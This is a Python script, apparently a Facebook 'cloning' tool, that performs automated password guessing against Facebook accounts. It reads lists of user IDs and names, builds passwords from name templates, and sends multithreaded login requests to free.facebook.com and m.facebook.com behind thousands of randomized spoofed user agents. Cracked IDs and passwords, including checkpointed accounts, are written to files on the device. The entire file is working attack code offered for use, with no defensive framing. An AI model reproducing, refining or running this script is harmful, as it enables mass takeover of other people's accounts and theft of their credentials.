#GITHUB : github.com/TEAM-KRS

from os import path
import os,base64,zlib,pip,urllib,time,random,requests
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
        os.system('git pull')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')

ugen=[]
ugen=[]
useragent=[]
uaku2=[]
ugen2=[]
uh_ua = random.choice(["Davik/2.1.0 (Linux; U; Android 4.2.4.0.0; SM-710 Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Kaios;FBBD/Kaios;FBDV/Kaios;FBSV/Kaios.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=1022,height=1040};]","Dalvik/2.1.0 (Linux; U; Android 12; moto e22 Build/SOVS32.121-25-2)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6296)","Dalvik/2.1.0 (Linux; U; Android 10; SH-02M Build/SA053)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22 Build/SOVS32.121-40-2)","Dalvik/2.1.0 (Linux; U; Android 11; SM-A325F Build/RP1A.200720.012) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; moto e40 Build/ROQ31.166-87)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one 5G Build/QPNS30.37-Q3-42-32-4-3)","Dalvik/2.1.0 (Linux; U; Android 5.1; I-S6 Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 5.0; Mix Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 12; moto g71 5G Build/S2RUBS32.51-15-3-10)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CQ54 Build/64.1.A.0.913)","Dalvik/2.1.0 (Linux; U; Android 11; land_rover_ks1920x720 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; M40 Pro_ROW Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669D Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ52 Build/61.2.A.0.439)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; MiTV4-ANSM0 Build/MHC19J)","Dalvik/2.1.0 (Linux; U; Android 11; M2006C3LVG Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; SM-G965F Build/QP1A.190711.020) VD/236","Dalvik/2.1.0 (Linux; U; Android 12; SM-G973F Build/SP1A.210812.016) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; Redmi 7A MIUI/V12.5.3.0.QCMEUXM) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; 8091_EEA Build/PPR1.180610.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; MXQ PRO Build/NHG47K)","Dalvik/2.1.0 (Linux; U; Android 12; moto e32(s) Build/STB32.36-91)","Dalvik/2.1.0 (Linux; U; Android 9; LAVA LH9931 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; Elite N55Max Build/T00624)","Dalvik/2.1.0 (Linux; U; Android 11; HiSmart 2K ATV4 Build/RTO6.230411.001)","Dalvik/2.1.0 (Linux; U; Android 13; V2253 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 40 pro Build/T1TR33.43-20-28)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AG Build/TP1A.220624.021)","Dalvik/2.1.0 (Linux; U; Android 13; SOG06 Build/64.1.D.0.120)","Dalvik/2.1.0 (Linux; U; Android 11; MATE 9 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one hyper Build/QPFS30.103-43-9)","Dalvik/2.1.0 (Linux; U; Android 13; 23049RAD8C Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 9; moto e6 play Build/POAS29.550-132-25) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; SM-A307GN Build/RP1A.200720.012) VD/235","Dalvik/2.1.0 (Linux; U; Android 12; moto g62 5G Build/S1SSS32.53-82-5)","Dalvik/2.1.0 (Linux; U; Android 13; SH-M19 Build/S3020)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SE1 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TD4A.221205.042.B1)","Dalvik/2.1.0 (Linux; U; Android 6.0; LGLS991 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 7.0; AS-503 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AG Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 9; TX6 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2389 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 10; K1 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 12; A103ZT Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CT54 Build/64.1.A.0.913)","Dalvik/2.1.0 (Linux; U; Android 11.1; Q96MAX Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 12; SM-N976Q Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; AQUOS-TVX19A Build/PTM5.200218.935)","Dalvik/2.1.0 (Linux; U; Android 9; B UHD Android TV Build/PTO2.220426.001)","Dalvik/2.1.0 (Linux; U; Android 9; SM-G970N Build/PQ3A.190605.05171606)","Dalvik/2.1.0 (Linux; U; Android 10; Deco 4K con Android TV Build/QTG1.221129.001)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CC54 Build/65.1.A.5.50)","Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 10; A95XF3Air Build/QT)","Dalvik/2.1.0 (Linux; U; Android 13; ASUS_I005D Build/TKQ1.220807.001)","Dalvik/2.1.0 (Linux; U; Android UpsideDownCake Build/UPB2.230407.019)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC52 Build/61.2.A.0.447)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BT52 Build/62.2.A.0.481)","Dalvik/2.1.0 (Linux; U; Android 9; Dell Chromebook 11 (3180) Build/R103-14816.131.0)","Dalvik/2.1.0 (Linux; U; Android 5.1; JALA.V158F3P.E6 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-20)","Dalvik/2.1.0 (Linux; U; Android 9; AT_SmartScreen Build/RTK2851P)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge (2021) Build/S1RMS32.68-43-16-9)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; ASUS_Z011D Build/LRX22G)","Dalvik/2.1.0 (Linux; U; Android 12; 100071483 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; 9296Q Build/RKQ1.210107.001)","Dalvik/2.1.0 (Linux; U; Android 9; T10LTE Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; YMP-A1 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12.0; uis8581a2h10_Automotive Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 12; moto g62 5G Build/S1SSS32.53-85-4-2)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; S22 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 9; SM-T515 Build/PPR1.180610.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; SM-J415FN Build/PPR1.180610.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 13; CPH2305 Build/SKQ1.221119.001)","Dalvik/2.1.0 (Linux; U; Android 13; V2040 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; SM-S9160 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; M2010J19SL Build/SKQ1.211202.001)","Dalvik/2.1.0 (Linux; U; Android 6.0; ALFA_8MB Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; 22127PC95I Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; ZTE A7050 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g 5G (2022) Build/S1SAS32.47-59-19)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; LG-LS995 Build/KOT49I.LS995ZVB)","Dalvik/2.1.0 (Linux; U; Android 9; moto e6s Build/POE29.288-46-6)","Dalvik/2.1.0 (Linux; U; Android 11; AI PONT Build/RTM3.211215.274)","Dalvik/2.1.0 (Linux; U; Android 9; kukui Build/R113-15393.58.0)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; reederA7iC Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 11; T6L Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12.0; PG11 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-25-15-15)","Dalvik/2.1.0 (Linux; U; Android 13; V2025 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; 5008D_EEA Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 6.0; Optima 8002 3G TS8001PG Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 6.0; Lenovo TB3-730F Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 11; p281 Build/RD2A.211001.002)","Dalvik/2.1.0 (Linux; U; Android 13; LE2110 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 9; jacuzzi Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 9; Acer Chromebook 15 (CB515-1H, CB515-1HT) Build/R113-15393.58.0)"])
ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
    
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU       

logo=("""   
\033[1;32m    888    d8P  8888888b.   .d8888b.  
\033[1;32m    888   d8P   888   Y88b d88P  Y88b 
\033[1;32m    888  d8P    888    888 Y88b.      
\033[1;35m    888d88K     888   d88P  "Y888b.   
\033[1;35m    8888888b    8888888P"      "Y88b. 
\033[1;32m    888  Y88b   888 T88b         "888 
\033[1;32m    888   Y88b  888  T88b  Y88b  d88P 
\033[1;32m    888    Y88b 888   T88b  "Y8888P"  
\t\t\t   \033[1;33mCHRISE ♥️ FELIX 
\033[1;32m-------------------------------------------
\033[1;35m   \033[1;32mCREATED BY   :  \033[1;32mCHRISE \033[1;36m&& \033[1;32mCHRISE
\033[1;35m   \033[1;33mFACEBOK      : \033[1;33m CHRISE-FELIX
\033[1;36m   \033[1;35mGITHUB       :  \033[1;35mCHRISE-410
\033[1;32m   \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m   \033[1;35mTEAM         :  \033[1;35mALONE
\033[1;34m   \033[1;32mTOOL VIRSION :  \033[1;32m6
\033[1;32m-------------------------------------------""")

def linex():
        print("\033[1;32m-------------------------------------------")
def clear():
        os.system(f'clear')
        print(logo)
loop=0
oks=[]
cps=[]
krk=[]
id=[]
tokenku=[]
os.system('git pull')





def KRRSS():
	clear()
	
	print(f"\n \033[1;37m[\033[1;32m1\033[1;37m] FILE CLONEING ")
	#print(f" [\033[1;32m2\033[1;37m] RANDOM CLONE")
	print(f" [\033[1;31m0\033[1;37m] Exit")
	me=input(f'\n\n [\033[1;32m•\033[1;37m] Choice : ')
	
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f'\n [\033[1;32m•\033[1;37m] FILE PATH \033[1;32m: ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' [\033[1;32mX\033[1;37m] File location Not Found ')
			exit()
		clear();print(f'\n [\033[1;31m1\033[1;37m] Method \033[1;32m1 \n [\033[1;31m2\033[1;37m] Method \033[1;32m2 ')
		mthd=input(f'\n [\033[1;32m•\033[1;37m] Salect : ')
		plist=[]
		try:
			clear();ps_limit = int(input(f'\n [\033[1;32m?\033[1;37m] How Many Passwords Do You Want To Add \033[1;33m: '))
		except:
			ps_limit =1
		clear();print(f'\n [\033[1;32m•\033[1;37m] Example: \033[1;36mfirst last,firtslast,first123 \033[1;37m\n')
		for i in range(ps_limit):
			plist.append(input(f' [\033[1;32m•\033[1;37m] Put password {i+1} :  '))
		clear()
		cx=('y')
		if cx in ['n','N','no','NO','2']:
			krk.append(f'n')
		else:
			krk.append(f'y')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f'\n Total Account : \033[1;32m{total_ids} ')
			print(f"\033[1;36m Use Flight Mode For Speed Up\033[1;37m")
			linex()
			for user in fo:
				ids,names = user.split('|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(m1,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(m2,ids,names,passlist)
				
				
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [KRS-M1] \033[1;36m|\033[1;37m %s \033[1;36m|\033[1;37m OK \033[1;36m|\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': uh_ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        KRRSS=session.cookies.get_dict().keys()
                        if "c_user" in KRRSS:
                                
                                print(f'\r\r\033[1;32m [KRS\033[1;36m-\033[1;37m\033[1;32mOK] %s \033[1;36m|\033[1;37m\033[1;32m %s'%(ids,pas))
                        
                        
                                open(f'/sdcard/KRS_OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                
                                break
                        
                        elif 'checkpoint' in KRRSS:
                                if 'y' in krk:
                                        print(f'\r\r\033[1;90m [KRS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/KRS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(10)
        loop+=1
                        

def m2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [KRS-M2] \033[1;36m|\033[1;37m %s \033[1;36m|\033[1;37m OK \033[1;36m|\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': uh_ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        KRRSS=session.cookies.get_dict().keys()
                        if "c_user" in KRRSS:
                                
                                print(f'\r\r\033[1;32m [KRS\033[1;36m-\033[1;37m\033[1;32mOK] %s \033[1;36m|\033[1;37m\033[1;32m %s'%(ids,pas))
                                
                                open(f'/sdcard/KRS_OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                
                                break
                        
                        elif 'checkpoint' in KRRSS:
                                if 'y' in krk:
                                        print(f'\r\r\033[1;90m [KRS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/KRS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(10)
        loop+=1


KRRSS()
